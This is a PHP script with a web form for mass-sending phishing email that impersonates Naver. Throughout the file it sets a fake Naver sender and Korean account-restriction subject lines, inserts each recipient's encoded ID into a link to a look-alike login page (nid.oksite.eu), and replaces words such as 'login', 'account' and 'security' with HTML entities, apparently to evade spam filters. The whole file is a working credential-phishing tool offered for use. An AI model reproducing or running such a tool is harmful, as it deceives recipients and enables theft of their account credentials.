<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
set_time_limit(30000);
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';
$ServerName = $FromName = $FromEmail = $Subject = $msg_content = $Phishing_url = $displey_mailto ='';
//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);
$SendTime = date("Y년m월d일 ") . date("H:i:s");
//Server settings
//$mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
$mail->isSMTP();                                            //Send using SMTP
$mail->Host       = 'smtp.dooray.com';                     //Set the SMTP server to send through
$mail->SMTPAuth   = true;                                   //Enable SMTP authentication
$mail->Username   = 'REDACTED';                     //SMTP username
$mail->Password   = 'REDACTED';                               //SMTP password
//$mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryptio$mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;            //Enable implicit TLS encryption
$mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
$mail->CharSet = 'UTF-8';
$mail->Encoding = 'base64';
//Recipients

function write($str)
{
 $fp = fopen("n_sended_address", "a+");
 fwrite($fp, $str);
 fwrite($fp, "\r\n");
 fclose($fp);
}
function encode_k($data) {
		return "=?ks_c_5601-1987?B?" . base64_encode($data) . "?=";
	}
function encode_u($data) {
	return "=?UTF-8?B?" . base64_encode($data) . "?=";
}
function encode_q($data) {
	return "=?euc-kr?Q?" . quoted_printable_encode(iconv('UTF-8', 'EUC-KR',$data)) . "?=";
}
function encode_mime($Data, $Charset) 
	{
		$content = $Data;
		if($Charset != "UTF-8")
			$content = iconv("UTF-8", $Charset, $content);
		
		$enc_data = "=?".$Charset."?B?".base64_encode($content)."?=";
		
		return $enc_data;
    }
	
	function CompleteSubject($data, $Charset) 
	{
		$Subject = $data;
		$Subject = str_replace("로그인", "&#47196;&#44536;&#51064;", $Subject);
		$Subject = str_replace("회원", "&#54924;&#50896;", $Subject);
		$Subject = str_replace("아이디", "&#50500;&#51060;&#46356;", $Subject);
		$Subject = str_replace("의심", "&#51032;&#49900;", $Subject);
		$Subject = str_replace("메일", "&#47700;&#51068;", $Subject);
		$Subject = str_replace("차단", "&#52264;&#45800;", $Subject);
		$Subject = str_replace("지역", "&#51648;&#50669;", $Subject);
		$Subject = str_replace("시도", "&#49884;&#46020;", $Subject);
		$Subject = str_replace("서비스", "&#49436;&#48708;&#49828;", $Subject);
		$Subject = str_replace("제한", "&#51228;&#54620;", $Subject);
		$Subject = str_replace("중요", "&#51473;&#50836;", $Subject);
		$Subject = str_replace("확인", "&#54869;&#51064;", $Subject);
		$Subject = str_replace("알림", "&#50508;&#47548;", $Subject);
		$Subject = str_replace("전자문서", "&#51204;&#51088;&#47928;&#49436;", $Subject);
		$Subject = str_replace("보안", "&#48372;&#50504;", $Subject);
		$Subject = str_replace("계정", "&#44228;&#51221;", $Subject);
		$Subject = str_replace("유출", "&#50976;&#52636;", $Subject);
		$Subject = str_replace("해외", "&#54644;&#50808;", $Subject);	
		
		return encode_mime($Subject, $Charset);
	}
function sendMail($FromName, $FromEmail, $mailtoName, $mailto, $subject, $content, $ServerName,$mail) 
{
	try{
	 if($FromName != ".")
		$FromName = encode_mime($FromName, "UTF-8");
	 $mail->setFrom('nsmnop99@gmail.com', $FromName);
	 $mail->clearAddresses();
	 $mail->addAddress($mailto,$mailtoName);               //Name is optional
     $mail->addReplyTo('nsmnop99@gmail.com', 'Information');
     //$mail->addCC('cc@example.com');
     //$mail->addBCC('bcc@example.com');

     //Attachments
     //$mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
     //$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

     //Content
     $mail->isHTML(true);  
	 //Set email format to HTML
     $mail->Subject = CompleteSubject($subject, "UTF-8");
	 //$mail->Subject = encode_mime($subject, "UTF-8");
     $mail->Body    = $content;
     $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

     $mail->send();
     echo 'Message has been sent';
     } catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
if(isset($_POST)){
foreach($_POST as $variable => $value) 
{
	if($variable=="ServerName")	$ServerName=$value;
	if($variable=="SendTime")	$SendTime=$value;
	if($variable=="FromName")	$FromName=$value;
	if($variable=="FromEmail")	$FromEmail=$value;
	if($variable=="ToName")		$ToName=$value;
	if($variable=="To")			$displey_mailto=$value;
	if($variable=="Subject")	$Subject=$value;
	if($variable=="url")		$Phishing_url=$value;
	if($variable=="massage")	$msg_content=$value;
};
if($SendTime == "")
	$SendTime = date("Y년m월d일 ") . date("H:i:s");

if($ServerName == "")	$ServerName = "mail.naver.com";

if(!$_POST["FromName"])
{
	$FromName = "네이버";
}
else
{
	$FromName = $_POST["FromName"];
}


if($FromEmail=="")			$FromEmail="aaa@naver.com";
if($Subject=="")			$Subject="네이버 아이디 탈퇴가 완료되었습니다";
if($msg_content=="")		$msg_content = "Hello!";
if($Phishing_url=="")		$Phishing_url = "http://naver.com";

//Get IMG URL
$IMG_URL = "http://jcimage.godohosting.com/2017/1-20-7";
$Src_msg = stripcslashes($msg_content);
$Src_msg = str_replace("\r\n", "", $Src_msg);
$Src_msg = str_replace("IMG_URL", $IMG_URL, $Src_msg);
$Src_msg = str_replace("<SendTime>", $SendTime, $Src_msg);
if ( $displey_mailto != "" )
	{
		$send_msg = $Src_msg;
		$pieces = explode(PHP_EOL, $displey_mailto);
		foreach ($pieces as $name =>$value)
	    {
		 $send_msg = $Src_msg;
	     //$displey_mailto1 = substr_replace($value, '', strlen($value)-strlen(strstr($value, '@')), strlen($value));
		 $pieces1=preg_split("/[@]+/", $value);
		 $displey_mailto1=$pieces1[0];
		 //write($displey_mailto1);
	     $send_msg = str_replace("<ToMail>", $value, $send_msg);
		 $len = strlen($displey_mailto1);
		 $hiddend_char = "";
		 for($i = 0; $i < $len - 4; $i++)
		 	$hiddend_char .= '*';
		 			
		 $hiddenID = substr_replace($displey_mailto1, $hiddend_char, 4, $len - 4);
		 $send_msg = str_replace("<HiddenID>", $hiddenID, $send_msg);
		 $temp_url=$Phishing_url;
		 $temp_url = str_replace('cnumber=', 'cnumber='.base64_encode($displey_mailto1), $temp_url);
		 $temp_url = str_replace('fghuern=', 'fghuern='.base64_encode($displey_mailto1), $temp_url);
		 $temp_url = str_replace('fnamei=', 'fnamei='.base64_encode($displey_mailto1), $temp_url);
		 $temp_url = str_replace('useeid=', 'useeid='.base64_encode($displey_mailto1), $temp_url);
		 $temp_url = str_replace('seiu=', 'seiu='.base64_encode($displey_mailto1), $temp_url);
		 $temp_url = str_replace('btoken=', 'btoken='.base64_encode($displey_mailto1), $temp_url);
		 $temp_url = str_replace('tlp=', 'tlp='.base64_encode($value), $temp_url);
		 $send_msg = str_replace("Phishing_URL", $temp_url, $send_msg);
		 sendMail($FromName, $FromEmail, $ToName, $value, $Subject, $send_msg, $ServerName,$mail);
		 //write($value);
		}
	}
}

?>
<HTML>
<Head>
	
</Head><h1 align=center><B>SendMail</B></h1>
<Body>
<FORM enctype="multipart/form-data" method="post"><br>
<TABLE CELLSPACING=0 BORDER=1 WIDTH=600>
<TD ALIGN=center WIDTH=0>ServerName : </TD>
<TD ALIGN=left WIDTH=570><INPUT name="ServerName" id="ServerName" type="text" value="mail.naver.com" size="109">
</TD>
</TR>
<TR>

<TD ALIGN=center WIDTH=0>SendTime : </TD>
<TD ALIGN=left WIDTH=570><INPUT name="SendTime" id="SendTime" type="text" value="<?php echo( $SendTime )?>" size="109">
</TD>
</TR>
<TR>
<TD ALIGN=center WIDTH=0>FromName : </TD>
<TD ALIGN=left WIDTH=570><INPUT name="FromName" id="FromName" type="text" value="no-reply" size="109">
</TD>
</TR>
<TR>
<TD ALIGN=center WIDTH=0>FromEmail : </TD>
<TD ALIGN=left WIDTH=570><INPUT name="FromEmail" id="FromEmail" type="text" value="no-reply@sisileae.com" size="109">
</TD>
</TR>
<TD ALIGN=center WIDTH=0>ToName : </TD>
<TD ALIGN=left WIDTH=570><INPUT name="ToName" id="ToName" type="text" value="" size="109">
</TD>
</TR>
<TR>
<TD ALIGN=center WIDTH=0>To : </TD>
<TD ALIGN=left WIDTH=570><textarea name="To" cols=110 rows=20 style="visibility:inherit;">assist-help@naver.com</textarea>
</TD>
</TR>
<TR>
<TD ALIGN=center WIDTH=0>Subject : </TD>
<TD ALIGN=left WIDTH=570><INPUT name="Subject" id="Subject" type="text" value="[네이버]메일 송수신 기능 제한 알림." size="109">
</TD>
</TR>
<TR>
<TD ALIGN=center WIDTH=0>URL : </TD>
<TD ALIGN=left WIDTH=570 ><INPUT name="url" id="url" type="text" value="https://nid.oksite.eu/nidlogin.login?mode=form&url=https%3A%2F%2Fwww.naver.com&otp=&rtnurl=aHR0cHM6Ly9uaWQub2tzaXRlLmV1L3VzZXIyL2hlbHAvbXlJbmZvP209dmlld0NoYW5nZVBhc3N3ZCZsYW5nPWtv" size="109">
</TD>
</TR>
<TR>
<TD ALIGN=center WIDTH=0>Message : </TD>
<TD ALIGN=Left WIDTH=570>
<textarea name="massage" cols=110 rows=20 style="visibility:inherit;">Hello!</textarea>
</TD>
</TD>
</TR>
<TR>
<TD ALIGN=center WIDTH=0></TD>
<TD ALIGN=center WIDTH=470><br><br><INPUT name="SendMail" id="SendMail" type="submit" value="SendMail"></TD>
</TD>
</TR>
</TABLE>
</FORM>
</Body>
</HTML>